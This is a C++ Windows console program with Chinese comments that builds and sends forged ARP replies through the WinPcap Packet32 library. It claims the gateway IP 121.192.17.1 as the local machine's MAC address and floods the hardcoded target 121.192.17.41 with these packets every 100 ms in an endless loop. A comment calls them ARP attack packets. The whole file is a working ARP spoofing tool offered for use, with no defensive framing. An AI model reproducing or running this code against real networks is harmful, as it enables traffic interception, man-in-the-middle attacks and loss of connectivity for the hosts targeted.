// myarp.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <stdio.h>
#include <winsock2.h>
#pragma comment(lib,"ws2_32")
#include "Iphlpapi.h"
#pragma comment(lib, "Iphlpapi.lib")
#include <Packet32.h>
#pragma comment(lib,"Packet.lib")

typedef struct ethdr
{
    unsigned char  eh_dst[6]; //目的MAC地址
    unsigned char  eh_src[6]; //源MAC地址
    unsigned short eh_type; //帧类型
}ETHDR,*PETHDR;

typedef struct arphdr
{
    unsigned short  arp_hdr;    //2字节硬件类型
    unsigned short  arp_pro;    //2字节协议类型
    unsigned char   arp_hln;    //1字节硬件地址长度
    unsigned char   arp_pln;    //1字节协议地址长度
    unsigned short  arp_opt;    //2字节操作类型
    unsigned char   arp_sha[6]; //6字节发送端MAC地址
	unsigned char   arp_spa[4]; //4字节发送端IP地址
    unsigned char   arp_tha[6]; //6字节目的MAC地址
    unsigned char   arp_tpa[4]; //4字节目的IP地址	
}ARPHDR,*PARPHDR;



#define MAX_NUM_ADAPTER 10
char      adapterlist[MAX_NUM_ADAPTER][1024];

BOOL GetLocMac(unsigned char *macaddr)
{
	PIP_ADAPTER_INFO pAdapterInfo = NULL;
	ULONG ulLen = 0;
	// 得到要申请的堆栈空间大小
	GetAdaptersInfo(pAdapterInfo,&ulLen);
	//申请所需的堆栈空间
	pAdapterInfo = (PIP_ADAPTER_INFO)GlobalAlloc(GPTR, ulLen);
	// 取得本地适配器结构信息
	if(GetAdaptersInfo(pAdapterInfo,&ulLen) ==  ERROR_SUCCESS)
	{
		if(pAdapterInfo != NULL)
		{
			//得到本地网卡MAC地址
			memcpy(macaddr, pAdapterInfo->Address, 6);
			return TRUE;
		}
	}
	return FALSE;
}

BOOL GetDestMac(char *szDestIP,unsigned char *macaddr)
{
	//用来保存目标主机MAC地址
	u_char arDestMac[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
	ULONG ulLen = 6;
	//得到目标主机MAC地址
	if(SendARP(inet_addr(szDestIP), 0, (ULONG*)arDestMac, &ulLen) == NO_ERROR)
	{
		//把MAC地址输出到参数
		memcpy(macaddr,arDestMac,6);
		return TRUE;
	}
	return FALSE;
}

int main(int argc, char* argv[])
{
	//存放适配器名称
	char		AdapterName[8192];
	ULONG		AdapterLength;
	//得到所有网卡适配器名称
	if(PacketGetAdapterNames(AdapterName,&AdapterLength)==FALSE)
	{
		printf("PacketGetAdapterNames Error\n");
		
	}
	int adapternum=0,open,i;
	char *name1,*name2;
	name1=AdapterName;
    name2=AdapterName;
    i=0;
	//列举出所有网卡名称
	while((*name1!='\0') || (*(name1-1)!='\0'))
    {
        if(*name1=='\0')
        {
            memcpy(adapterlist[i],name2,2*(name1-name2));
            name2=name1+1;
            i++;
        }
        name1++;
    }
    adapternum=i;
    printf("Adapters Installed: \n");
	//答应出所有网卡名称
    for(i=0;i<adapternum;i++)
    {
        printf("%d - %s\n",i+1,adapterlist[i]);   
    }
	//由用户选择要打开的网卡
	do
    {
        printf("\nSelect the number of the adapter to open: ");
        scanf("%d",&open);
		//输入的网卡号必须比1大，比所有网卡数加1小
        if(open>=1 && open<adapternum+1)
            break;
    }while(open<1 || open>adapternum);
	//打开选择的网卡
	LPADAPTER lpadapter=PacketOpenAdapter(adapterlist[open-1]);
    if(!lpadapter || (lpadapter->hFile==INVALID_HANDLE_VALUE))
    {
        printf("PacketOpenAdapter Error\n");
        return -1;
    }
	LPPACKET lppackets;
	//为LPPACKET结构分配空间
	if((lppackets=PacketAllocatePacket())==FALSE)
    {
        printf("PacketAllocatePacket Send Error\n");
        return -1;
    }
	ETHDR  eth;
    ARPHDR arp;
    //目的MAC地址
	GetDestMac("121.192.17.41",eth.eh_dst);
	//源MAC地址
	GetLocMac(eth.eh_src);
	//帧类型
	eth.eh_type=htons(0x0806);
	//硬件类型
	arp.arp_hdr=htons(0x0001);
	//协议类型
	arp.arp_pro=htons(0x0800);
	//硬件地址长度
	arp.arp_hln=6;
	//协议地址长度
	arp.arp_pln=4;
	//操作类型
	arp.arp_opt=htons(0x0002);
	//发送端mac地址
	GetLocMac(arp.arp_sha);
	//发送端ip地址，设为网关的ip
	arp.arp_spa[0]=121;
	arp.arp_spa[1]=192;
	arp.arp_spa[2]=17;
	arp.arp_spa[3]=1;
	//目标主机Mac地址
	GetDestMac("121.192.17.41",arp.arp_tha);
	//目标主机Mac地址
	arp.arp_tpa[0]=121;
	arp.arp_tpa[1]=192;
	arp.arp_tpa[2]=17;
	arp.arp_tpa[3]=41;
	char   sendbuf[1024]={0};
	//把以太网首部和ARP报文都拷贝到sendbuf中，组成完整的ARP数据包
	memcpy(sendbuf,&eth,sizeof(eth));
	memcpy(sendbuf+sizeof(eth),&arp,sizeof(arp));
	//初始化LPPACKET结构
	PacketInitPacket(lppackets,sendbuf,sizeof(eth)+sizeof(arp));
	//循环发送ARP攻击数据包
	for (;;)
	{
		if(PacketSendPacket(lpadapter,lppackets,TRUE)==FALSE)
		{
			printf("PacketSendPacket in arpspoof Error: %d\n",GetLastError());
			return -1;
		}
		Sleep(100);
	}
	//关闭打开的网卡
	PacketCloseAdapter(lpadapter);
	return 0;
}
